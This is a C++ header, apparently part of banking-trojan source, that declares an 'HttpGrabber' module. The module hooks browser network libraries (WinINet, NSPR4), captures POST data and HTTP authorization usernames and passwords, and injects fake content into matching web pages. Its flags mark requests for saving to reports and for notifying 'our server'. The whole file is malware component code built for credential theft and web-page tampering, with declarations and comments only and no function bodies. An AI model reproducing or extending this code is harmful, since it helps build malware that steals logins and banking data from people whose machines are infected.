/*
  Общии функции для граббинга HTTP.
*/
#pragma once

#include "..\common\httpinject.h"
#include "..\common\binstorage.h"

namespace HttpGrabber
{
  //Различные константы.
  enum
  {
    MAX_POSTDATA_SIZE = 1 * 1024 * 1024
  };
  
  //Тип запроса.
  enum
  {
    VERB_GET,  //GET
    VERB_POST  //POST
  };

  //Данные инжейте, фейки.
  typedef struct
  {
    DWORD flags;                      //Флаги HttpInject::FLAG_*.
    LPSTR urlMask;                    //Маска URL.
    LPSTR contextMask;                //Белая маска контента.
    HttpInject::INJECTBLOCK *injects; //Данные инжекта. Уже проверенные на ошибки.
    DWORD injectsSize;                //Размер injects в байтах.
  }INJECTFULLDATA;

  //Флаги запроса.
  enum
  {
    RDF_WININET = 0x1, //Запрос пришел от wininet.
    RDF_NSPR4   = 0x2, //Запрос пришел от NSPR4.
  };

  //Данные запроса.
  typedef struct
  {    
    /*
      Флаги.
    */
    DWORD flags;
    
    /*
      IN Некий хэндл запроса (зависит от перехватываемой библиотеки).
    */
    void *handle;
    
    /*
      IN URL. Выделяется через Mem.
      
      Освобождается через _freeRequestData().
    */
    LPSTR url;

    /*
      IN Кол. байт в URL, исключая нулевеой байт.
    */
    DWORD urlSize;

    /*
      IN Реферер.
      
      Освобождается через _freeRequestData().
    */
    LPSTR referer;

    /*
      IN Кол. байт в реферерере, исключая нулевеой байт.
    */
    DWORD refererSize;

    /*
      IN VERB_*.
    */
    BYTE verb;

    /*
      IN Тип контента, т.е. тип POST-данных.
      
      Освобождается через _freeRequestData().
    */
    LPSTR contentType;

    /*
      IN Размер contentTypeSize.
    */
    DWORD contentTypeSize;

    /*
      IN OUT POST-данные (могут не кончатсья на 0). Если возращен флаг
      ANALIZEFLAG_POSTDATA_REPLACED,данные будут подменены на новые данные, которые нужно
      освободить через Mem после отправки запроса.
    */
    void *postData;

    /*
      IN OUT Размер postData. Значение не должно превыщать MAX_POSTDATA_SIZE.
    */
    DWORD postDataSize;
	
    /*
      IN Данные HTTP-авторизации.
    */
    struct 
    {
      LPWSTR userName;   //Имя пользователя.
      LPWSTR password;   //Пароль.
      LPSTR unknownType; //Заполняется оригинальной строкой в случаи неизвестного типа авторизации.
    }authorizationData;
	
    /*
      OUT Список инжектов, актуально только при ANALIZEFLAG_URL_INJECT. 

      Освобождается через _freeInjectFullDataList().
    */
    INJECTFULLDATA *injects;

    /*
      OUT Размер массива injectData.
    */
    DWORD injectsCount;

    /*
      IN Текущая конфигурация. NULL, если не сущетвует. Данная конфигурация доступна только для
      чтения.

      Освобождается через _freeRequestData().
    */
    BinStorage::STORAGE *currentConfig;

  }REQUESTDATA;

  //Флаги для analizeRequestData().
  enum
  {
    
    ANALIZEFLAG_URL_INJECT          = 0x02, //Действие. Получены данные на инжейт/фейк.
    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Информация. Запрос сохранен в отчет.
    ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Post request is encoded "application/x-www-form-urlencoded".
    ANALIZEFLAG_AUTHORIZATION       = 0x20, //Присутвуют данные HTTP-авторизации.	
    ANALIZEFLAG_URL_CAPTCHA         = 0x40, //Request matched capcha entry.

    ANALIZEFLAG_NOTIFY_CC           = 0x80, //Request matched URL that we need to report to our server.
	
  };

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);
  
  
  /*
    Надстройка над Str::matchA() для URL.

    IN mask     - маска.
    IN url      - URL.
    IN urlSize  - размер URL.
    IN advFlags - дополнительные флаги Str::MATCH_*.

    Return - true  - совпадение найдено,
             false - совпадение не найдено.
  */
  bool _matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags);

  /*
    Надстройка над Str::matchA() для POST-данных.

    IN mask         - маска.
    IN postData     - POST-данные.
    IN postDataSize - размер POST-данных.

    Return          - true  - совпадение найдено,
                      false - совпадение не найдено.
  */
  bool _matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize);
  
  /*
    Надстройка над Str::matchA() для текстового содержимого.

    IN mask        - маска.
    IN context     - содержимое.
    IN contextSize - размер содержимого.
    IN advFlags    - дополнительные флаги Str::MATCH_*.

    Return         - true  - совпадение найдено,
                     false - совпадение не найдено.
  */
  bool _matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags);

  /*
    Надстройка над Str::matchA() для текстового содержимого.

    IN mask         - маска.
    IN maskSize     - размер маски.
    IN context      - содержимое.
    IN contextSize  - размер содержимого.
    OUT offsetBegin - оффсет начала действия маски в context. Может быть NULL.
    OUT offsetEnd   - оффсет конца действия маски в context. Может быть NULL.
    IN advFlags     - дополнительные флаги Str::MATCH_*.

    Return          - true  - совпадение найдено,
                      false - совпадение не найдено.
  */
  bool _matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags);

  /*
    Добавление элемента в список URL.

    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - локальная конфигурация.
    IN urlMask         - маска URL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.

  */
  bool _addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask);
  
  /*
    Удаление элемента из список URL.

    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - локальная конфигурация.
    IN maskOfurlMask   - маска маски URL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.

  */
  bool _removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask);
  
  /*
    Проверка находиться ли URL в списке.

    IN listId      - тип списка LocalConfig::ITEM_URLLIST_*.
    IN localConfig - локальная конфигурация.
    IN url         - URL.
    IN urlSize     - размер URL.
    IN advFlags    - дополнительные флаги Str::MATCH_*.

    Return         - true - URL найдена,
                     false - URL не найдена.
  */
  bool _isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags);
  
  /*  
	Return timeBlock value for last url that was refresh-block list
  */
  DWORD _getLastTimeBlockValue();

  /*
    Анализ URL, и установка соответвующих задач для нее.

    IN OUT requestData - данные запроса.
    
    Return             - ANALIZEFLAG_*.
  */
  DWORD analizeRequestData(REQUESTDATA *requestData);

  /*
    Исполнение инжектов в контексте.

    IN url             - URL.
    IN OUT context     - контекст для изменения.
    IN OUT contextSize - размер контекста.
    IN dataList        - список инжектов.
    IN count           - кол. инжектов.

    Return             - true - в конекст были внесены изменения,
                         false - изменения не были внесены (не означает ошибку).
  */
  bool _executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count);
  
  /*
    Освобождение всех данных REQUESTDATA выделеяемых через Mem.

    IN OUT requestData - структура.
  */
  void _freeRequestData(REQUESTDATA *requestData);

  /*
    Освобождение всех данных INJECTFULLDATA выделеяемых через Mem.

    IN OUT data - структура.
  */
  void _freeInjectFullData(INJECTFULLDATA *data);

  /*
    Освобождение всего массива INJECTFULLDATA.

    IN dataList - массив.
    IN count    - размер массива.
  */
  void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);

};
